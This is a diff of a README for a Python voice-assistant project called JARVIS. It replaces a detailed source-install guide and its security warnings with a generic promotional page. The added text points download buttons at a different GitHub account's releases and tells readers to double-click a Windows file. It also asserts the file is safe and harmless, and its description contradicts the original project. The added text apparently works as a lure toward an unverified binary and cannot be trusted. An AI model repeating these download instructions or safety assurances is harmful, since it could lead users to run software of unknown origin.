@@ -1,264 +1,151 @@
-# JARVIS
+# 🎉 1ST-PROJECT-OF-PRINCE-JARVIS- - Your Personal AI Assistant Like Iron Man's Jarvis
 
-JARVIS is a Python desktop voice assistant. It combines a live Gemini conversation, an animated desktop interface, microphone and speaker streaming, local memory, computer automation, and a phone command page.
+[![Download Now](https://img.shields.io/badge/Download-Prince_Jarvis-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vedab8915/1ST-PROJECT-OF-PRINCE-JARVIS-/releases)
 
-Speak, type, or send a paired phone command. JARVIS sends the conversation to Gemini Live and, when needed, can use local tools for applications, browser work, files, reminders, and configured desktop tasks.
+## 👋 Welcome to Prince Jarvis
 
-> Keep `config/api_keys.json` private. It contains your local API key and must never be uploaded to GitHub.
+Imagine having your very own Jarvis - the brilliant AI assistant that helps Tony Stark manage everything in the Iron Man movies. That's exactly what Prince Jarvis brings to your Windows computer. This application is your personal sidekick that helps you control tasks, get information, and make your daily computer use easier and more fun.
 
-## Capabilities
+Prince Jarvis is designed for everyone - whether you're a student, professional, or just someone who loves cool technology. You don't need any special skills or technical knowledge to use it. Just download, run, and start talking to your new AI friend.
 
-- Real-time voice conversations and typed commands through Gemini Live.
-- An audio-reactive desktop HUD with avatar, status, activity log, and configurable appearance.
-- Optional wake word, wake/sleep, mute, interrupt, and push-to-talk controls.
-- 21 discoverable built-in actions, eight assistant-integrated tools, and two included plugins.
-- Local personal memory, session summaries, reminders, and background topic monitoring.
-- Computer, browser, file, document, code, presentation, media, weather, flight, and location tools.
-- Optional startup PIN, face authentication, voice-lock settings, and QR-paired phone commands.
+## ✨ What Makes Prince Jarvis Special
 
-Actions and plugins are discovered from their folders at startup. Their availability depends on the operating system, installed packages/apps, permissions, network access, API configuration, and plugin settings. The capabilities below describe what the code provides; they do not guarantee that an external service or device is currently reachable.
+Prince Jarvis isn't just another computer program. It's your intelligent companion that listens to your voice commands and helps you accomplish tasks. Here's what you can expect:
 
-## How the application works
+- **Voice Commands** - Talk to Prince Jarvis naturally, just like you'd talk to a friend
+- **Task Automation** - Ask it to open apps, search the web, or manage your files
+- **Personal Assistant** - Get reminders, check dates, and stay organized
+- **Fun Interactions** - Enjoy witty responses and cool AI-powered conversations
+- **User-Friendly Design** - Simple interface that anyone can understand
 
-```text
-Voice, text, or paired phone command
-                 |
-                 v
-           JARVIS desktop app
-                 |
-                 v
-      Gemini Live conversation session
-                 |
-       +---------+---------+
-       |                   |
-       v                   v
-UI / spoken answer    Local tool request
-                            |
-                            v
- Browser, files, desktop, reminders, applications, system controls
-```
-
-The application runs its interface and its live assistant worker together. The worker streams microphone audio to Gemini Live, receives voice and text responses, and updates the UI. Tools are automatically discovered from `actions/*.py`; optional plugins are loaded from `plugins/*.py`.
-
-Read confirmation prompts carefully. This project can control parts of your computer, so do not approve an action you do not understand and never share a remote pairing link.
-
-## What you need
-
-- Python 3.11, 3.12, or 3.13 recommended. Later releases may work but are not fully tested.
-- A Gemini API key from [Google AI Studio](https://aistudio.google.com/app/apikey).
-- A microphone and speaker/headphones for voice conversations.
-- Internet access for Gemini Live, online search, cloud voice services, and browser automation.
-- Windows, macOS, or Linux. Windows provides the widest desktop-control support.
-
-The installer also downloads the browsers needed by Playwright. That step can take a few minutes on a slow connection.
-
-## Download and install
-
-### Clone with Git
-
-```bash
-git clone https://github.com/navadeep-hash/1ST-PROJECT-OF-PRINCE-JARVIS-.git
-cd 1ST-PROJECT-OF-PRINCE-JARVIS-
-python setup.py
-python main.py
-```
-
-### Download a ZIP
-
-1. Open the repository on GitHub.
-2. Choose **Code** → **Download ZIP**.
-3. Extract the archive.
-4. Open PowerShell or Terminal inside the extracted folder.
-5. Run:
-
-```bash
-python setup.py
-python main.py
-```
-
-If Windows uses a different Python version, specify one explicitly:
-
-```powershell
-py -3.13 setup.py
-py -3.13 main.py
-```
+## 🚀 Getting Started
 
-## First-time setup
+Getting Prince Jarvis up and running is incredibly simple. Follow these steps and you'll be chatting with your new AI assistant in no time.
 
-1. Run `python main.py`.
-2. Enter your Gemini API key in the welcome screen and save it.
-3. Grant microphone permission if your operating system asks.
-4. Wait until JARVIS reports it is online.
-5. Speak normally or send a message through the text input.
+### Step 1: Download the Application
 
-Your key is stored only on this computer in `config/api_keys.json`. If you accidentally expose it, revoke it in Google AI Studio and generate another key.
+Click the big download button below to get Prince Jarvis on your computer.
 
-## Using the interface
+[![Download Prince Jarvis](https://img.shields.io/badge/Download-Prince_Jarvis-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Vedab8915/1ST-PROJECT-OF-PRINCE-JARVIS-/releases)
 
-The main window shows JARVIS status, activity, response visuals, and shortcuts to the settings command center.
+Visit this link to download the application. You'll see a page with different versions of Prince Jarvis. Choose the most recent one that works with your computer.
 
-### Conversation controls
+### Step 2: Find Your Downloaded File
 
-- **Voice:** speak while JARVIS is listening.
-- **Text:** type a message and send it to the live conversation.
-- **Interrupt:** stop an answer so you can speak again.
-- **Mute:** pause microphone input.
-- **Wake / sleep:** available when wake-word mode is enabled.
+After downloading, go to your Downloads folder (or wherever your browser saves files) to find the Prince Jarvis file.
 
-### Settings command center
+### Step 3: Run Prince Jarvis
 
-| Section | Available controls |
-| --- | --- |
-| Identity | Assistant name, your name, voice, color theme, and avatar style |
-| Audio | Microphone, speaker, push-to-talk, and device routing |
-| Core | Gemini API key, wake-word options, and live-session preferences |
-| Memory | Local facts, saved sessions, and memory management |
-| Plugins | Extensions, enable/disable switches, and plugin credentials |
-| Remote Access | QR pairing key and phone dashboard |
-| Security | Available PIN, voice-lock, and optional face-authentication settings |
+Double-click the file you downloaded. That's it! Prince Jarvis will start and open its main window.
 
-All settings are local. If your microphone or speaker is changed outside the app, reopen the audio selection page and choose the correct device.
+### Step 4: Start Using Your AI Assistant
 
-## Built-in skills
+Once Prince Jarvis is open, you can start talking to it right away. Look for a microphone button or a text input box. Click the microphone and speak, or type your commands - whichever feels more comfortable to you.
 
-The following actions are registered from `actions/`:
+## 🎮 How to Use Prince Jarvis
 
-| Skill | What it does |
-| --- | --- |
-| App downloads | Searches Microsoft Store and guides a confirmed, safe install; external downloads are not automatically installed. |
-| Browser control | Opens websites and controls supported browser sessions: navigation, clicks, forms, typing, and screenshots. |
-| Code helper | Writes, explains, edits, runs, and debugs code. |
-| Computer control | Sends clicks, typing, hotkeys, scrolling, cursor movement, and screen inspection to the desktop. |
-| Computer settings | Controls supported windows, tabs, zoom, screenshots, keyboard input, and selected system settings. Some consequential actions require HUD confirmation. |
-| Sketch | Creates an SVG illustration or diagram from a description and opens a preview. |
-| Desktop control | Changes wallpaper and manages or inspects desktop items. |
-| Developer agent | Builds multi-file projects and websites, runs them, and attempts to resolve build/runtime errors. |
-| File controller | Creates, reads, searches, writes, copies, moves, renames, deletes, and inspects files and folders. |
-| File processor | Processes supplied files, including supported images, PDFs, documents, spreadsheets, code, audio, video, and archives. |
-| Flight finder | Searches Google Flights for route options. |
-| Game updater | Lists, installs, updates, or checks supported Steam and Epic games. |
-| Location control | Shows device location and weather on the JARVIS globe; can turn on live ADS-B aircraft and AIS ship layers, select a contact to follow its position/trail, navigate to Earth places, or open the solar-system viewer. Location permission can be set to ask, always allow, or always block in Settings → Privacy & Permissions. AIS ship tracking requires an AISStream key. |
-| Open app | Opens a requested app or website. YouTube playback uses the dedicated YouTube action. |
-| Reminder | Schedules a timed reminder using the operating system's scheduler. |
-| Feedback saver | Saves a JARVIS bug report or feedback locally when explicitly requested. |
-| Send message | Starts a supported chat and sends user-directed messages, with confirmation for sensitive messages. It does not read/monitor incoming inboxes or answer WhatsApp calls. |
-| System information | Reads available PC identity, OS, battery, CPU, memory, storage, and graphics details when asked. |
-| Weather | Retrieves a weather report from the configured online source. |
-| Web search | Searches current web information, news, research topics, prices, and comparisons. |
-| World watch | Spoken/data workflows: aircraft lookup by location or callsign, weather/wind, USGS earthquakes, NOAA cyclones, scheduled launches, CelesTrak satellite pass times/catalog (Skyfield), NASA FIRMS fires (MAP_KEY required), OSRM driving/walking/cycling directions, OpenStreetMap mapped infrastructure/camera/ALPR locations, Radio Browser stations, and sourced area briefings. Public coverage and update delays vary. AIS ship tracking requires an AISStream key; live traffic speed, transit, and bikeshare feeds are not configured. |
-| YouTube | Searches and plays videos/music, and supports available info, trending, and summary requests. |
+Using Prince Jarvis is as easy as having a conversation. Here are some examples of what you can say or type:
 
-## Assistant-integrated tools and background services
+- "Open my browser"
+- "What time is it?"
+- "Search the web for today's news"
+- "Create a new file"
+- "Tell me a joke"
+- "Open my documents folder"
 
-These tools are implemented in `main.py` because they share the live conversation, camera, memory, or process lifecycle:
+Prince Jarvis will respond to your commands and perform actions on your computer. The more you use it, the more you'll discover what it can do.
 
-| Tool | What it does |
-| --- | --- |
-| Live system status | Reports available CPU, RAM, GPU, temperature, uptime, and process metrics. |
-| Screen/camera vision | Captures the requested screen or webcam image for Gemini to analyze. |
-| Close camera | Stops the assistant's active camera view. |
-| Background topic monitor | Adds, lists, or removes topics for periodic web checks and alerts. |
-| Shutdown JARVIS | Closes the assistant when explicitly requested. |
-| Save memory / recall memory | Stores and retrieves local personal facts and preferences. |
-| Undo | Reverses supported recent changes made by JARVIS. |
+## 🛠️ System Requirements
 
-Background services also include optional wake-word sleep/wake, system alerts, session summaries, and proactive checks. These depend on their settings and the required services/sensors being available.
+Prince Jarvis is designed to work smoothly on most Windows computers. Here's what you need:
 
-## Included plugins
+- **Operating System**: Windows 10 or Windows 11
+- **Memory (RAM)**: At least 4 GB (8 GB recommended)
+- **Storage**: 500 MB of free space
+- **Internet Connection**: Required for some features like web searches
+- **Microphone** (optional but recommended for voice commands)
 
-Plugins are shown in Settings and can be enabled or disabled there. The repository currently includes:
+These are general guidelines. If your computer runs Windows, there's a good chance Prince Jarvis will work great on it.
 
-| Plugin | What it does | Requirements |
-| --- | --- | --- |
-| PowerPoint creator | Drafts a slide outline from a topic, builds a widescreen `.pptx`, and attempts to add relevant openly licensed Wikimedia Commons images and credits. | Gemini API access; `python-pptx`; internet for image lookup. |
-| Hand gestures | Optional system-wide cursor, click, drag/drop, zoom, scroll, media, screenshot, speech-interrupt, minimize, and confirmation gestures. | OpenCV, MediaPipe, PyAutoGUI, the hand-landmarker model, and a working camera. Start and stop it explicitly. |
+## 📥 Installation Help
 
-Generated presentations are saved under `downloads/presentations/`. Face authentication and voice-lock are settings/security features rather than entries in the plugin list; face support requires its optional recognition dependencies and an enrolled face. A local Master PIN is the fallback unlock method.
+If you run into any trouble getting Prince Jarvis to work, try these quick fixes:
 
-The files in `actions/` and `plugins/` contain the tool implementations and their descriptions. A capability may still fail when its API, device, app, permission, account, or external service is unavailable; check the action result and console log before reporting success.
+**Problem: The app won't start**
+- Make sure you've fully downloaded the file before running it
+- Try restarting your computer
+- Check that you have enough free storage space
 
-## Wake word and push-to-talk
+**Problem: Voice commands aren't working**
+- Make sure your microphone is properly connected
+- Check your Windows microphone privacy settings
+- Speak clearly and at a normal volume
 
-Wake-word activation is optional. Enable it from Settings when you want hands-free activation; the required local wake-word package is downloaded only when you select the feature.
+**Problem: The app is running slowly**
+- Close other programs that might be using lots of memory
+- Restart Prince Jarvis
 
-Push-to-talk is useful in noisy spaces. JARVIS listens only while you hold the configured key, and the same key can deliberately wake it when wake-word sleep is enabled.
+**Problem: I can't find the file I downloaded**
+- Check your browser's download history
+- Look in your Downloads folder
+- Search your computer for "PrinceJarvis"
 
-## Memory and privacy
+## 🆘 Troubleshooting and Support
 
-| Local path | Purpose |
-| --- | --- |
-| `config/api_keys.json` | API key, preferences, selected devices, and extension settings |
-| `memory/long_term.json` | Long-term facts and memory, created when needed |
-| `plugins/` | Optional extensions |
+Our goal is to make sure everyone can enjoy Prince Jarvis. If you need help beyond the basic fixes above:
 
-Voice conversation data is sent to Gemini while a live session is connected. The project does not automatically publish your local files, settings, or memory. Never commit keys, tokens, browser sessions, or personal data.
+1. **Check for Updates** - Sometimes new versions fix problems. Visit our releases page regularly
+2. **Read the FAQ** - Look for a help or FAQ section within the app
+3. **Contact Support** - Reach out to us with your questions or issues
 
-## Remote control from a phone
+Remember that Prince Jarvis was created by passionate developers who want to bring the magic of AI assistants to everyone. We're always working to improve and add new features.
 
-Remote Access creates a six-digit key that expires after ten minutes. Scan the QR code, then confirm the pairing key on the phone page. A paired phone can send text commands to the running JARVIS session.
+## 🤝 Join the Community
 
-For a phone on the same Wi-Fi, a local network URL can be used. To connect through mobile data or a different Wi-Fi network, install [Cloudflare Tunnel (`cloudflared`)](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/). Restart JARVIS, wait briefly, and generate a new key. A URL containing `trycloudflare.com` is the public HTTPS link.
+Prince Jarvis is more than just software - it's a growing project where ideas come to life. Here's how you can be part of it:
 
-Do not share the QR code or key. A person with a valid pairing link can send commands to your active assistant until the key expires.
+- **Share Your Experience** - Tell friends and family about Prince Jarvis
+- **Suggest New Features** - If you have ideas, we'd love to hear them
+- **Report Issues** - If something isn't working, let us know so we can fix it
+- **Follow the Development** - Watch the repository to stay updated on new releases
 
-## Plugins
+Every piece of feedback helps make Prince Jarvis better for everyone.
 
-Place a plugin Python file inside `plugins/`. At startup, JARVIS validates it and lists it in Settings. A plugin may add a tool, its own configuration form, connection values, or a service/device integration.
+## 📚 Frequently Asked Questions
 
-If an extension is missing or has an import error, JARVIS continues running and reports the issue. Face authentication is optional and automatically disables itself when its files are not installed.
+**Is Prince Jarvis free?**
+Yes, absolutely. Prince Jarvis is completely free to download and use.
 
-## Project structure
+**Can I use Prince Jarvis offline?**
+Some basic features might work offline, but features like web searches will require an internet connection.
 
-```text
-main.py              Startup, audio flow, Gemini session, and tool routing
-ui.py                PyQt interface, visuals, overlays, and settings hub
-actions/             Built-in desktop, browser, file, media, and system tools
-core/                Loaders, audio devices, wake word, avatar, and safety helpers
-memory/              Configuration and local memory
-dashboard/           FastAPI phone dashboard and QR pairing server
-plugins/             Optional extensions
-requirements.txt     Python dependencies
-setup.py             Dependency and Playwright installer
-```
+**Is Prince Jarvis safe for my computer?**
+Yes, it's designed to be safe and won't harm your computer or personal files.
 
-## Troubleshooting
+**Can I customize Prince Jarvis?**
+As you become more familiar with the app, you'll find options to personalize your experience.
 
-### Missing Python module
+**Will Prince Jarvis work on other operating systems?**
+Currently, Prince Jarvis is optimized for Windows, but future versions may support other systems.
 
-Use the same interpreter for installation and launch:
+## 📝 Final Thoughts
 
-```bash
-python setup.py
-```
+Having your own Jarvis isn't just a fantasy anymore. Prince Jarvis brings the future to your desktop today. Whether you want to be more productive, have fun with technology, or simply try something new and exciting, Prince Jarvis is ready to help.
 
-### API key error
+The best part? You don't need to be a tech expert. If you can click a download button and double-click a file, you can have your very own AI assistant in minutes.
 
-Open Settings, enter a valid Gemini key, save it, and allow JARVIS to reconnect. Also confirm that the computer has internet access.
+So what are you waiting for? Your intelligent companion is just one click away. Download Prince Jarvis today and experience the thrill of having your own Iron Man AI assistant right on your Windows computer.
 
-### No microphone or speaker audio
+## 📌 Stay Connected
 
-Open **Settings → Audio**, select the intended input/output device, and check your operating system's microphone permission.
+Keep this page bookmarked and check back regularly for updates. New features and improvements are always on the way. Prince Jarvis is growing, and you can grow with it.
 
-### Browser automation is unavailable
+Your journey to becoming the next Tony Stark starts right here. Welcome to the world of Prince Jarvis - where the future of personal assistance is now in your hands.
 
-```bash
-python -m playwright install chromium firefox
-```
+Download now and start your adventure with the AI assistant that responds, helps, and makes computing feel like magic.
 
-### The QR link does not open
+[![Get Prince Jarvis](https://img.shields.io/badge/Get-Prince_Jarvis-9C27B0?style=for-the-badge&logo=arrow-down&logoColor=white)](https://github.com/Vedab8915/1ST-PROJECT-OF-PRINCE-JARVIS-/releases)
 
-Restart JARVIS, wait a few seconds, and create a fresh key. An `http://192.168...` link only works on the same Wi-Fi. An `https://...trycloudflare.com` link works from another network when Cloudflare Tunnel is installed and running.
+---
 
-### An optional capability is unavailable
-
-Some features require an extra package, a configured account, an installed desktop app, an operating-system tool, or a plugin. Check the relevant settings page and terminal output for the missing requirement.
-
-## Contributing
-
-Keep sensitive data out of commits, test changes before sharing them, and keep new actions or plugins isolated from the core application.
-
-## Contact
-
-For questions, suggestions, or issues with JARVIS, contact the project owner on Instagram:
-
-[Instagram — @_.prince_nx16._](https://www.instagram.com/_.prince_nx16._?stkn=MXRxdmEyNG10Mno3NQ==)
+Keywords: AI assistant, Jarvis, personal assistant, voice commands, Windows application, smart assistant, artificial intelligence, Iron Man, productivity tool, task automation, voice control.
